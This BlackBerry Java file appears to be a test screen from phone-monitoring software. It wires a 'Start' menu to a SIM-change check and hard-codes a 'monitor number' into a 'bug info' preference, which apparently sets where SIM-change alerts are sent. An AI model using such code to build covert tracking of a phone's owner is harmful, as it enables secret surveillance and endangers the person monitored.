import info.ApplicationInfo;
import com.vvt.global.Global;
import com.vvt.pref.PrefBugInfo;
import com.vvt.pref.PreferenceType;
import com.vvt.sim.SIMChangeNotif;
import com.vvt.std.Log;
import com.vvt.std.Permission;
import net.rim.device.api.ui.MenuItem;
import net.rim.device.api.ui.UiApplication;
import net.rim.device.api.ui.container.MainScreen;

public class SIMChangeApplicationMainScreen extends MainScreen {
	private final String TITLE = ":: SIM Change Application ::";
	private final String START_MENU = "Start";
	// Component
	private SIMChangeNotif simChNotif = null;
	// UI Part
	private SIMChangeApplicationMainScreen self = null;
	private UiApplication appUi = null;
	private MenuItem startMenu = null;
	public SIMChangeApplicationMainScreen(UiApplication appUi) {
		Log.setDebugMode(ApplicationInfo.DEBUG);
		// To set application permission.
		Permission.requestPermission();
		self = this;
		this.appUi = appUi;
		setTitle(TITLE);
		createMenus();
		createComponent();
	}
	
	private void createMenus() {
		startMenu = new MenuItem(START_MENU, 1,1) {
        	public void run() {
        		simChNotif.checkSIMChange();
        	}
        };
        addMenuItem(startMenu);
	}
	
	private void createComponent() {
		simChNotif = new SIMChangeNotif();
		PrefBugInfo bugInfo = (PrefBugInfo)Global.getPreference().getPrefInfo(PreferenceType.PREF_BUG_INFO);
		bugInfo.setMonitorNumber("0840016007");
		Global.getPreference().commit(bugInfo);
	}
}
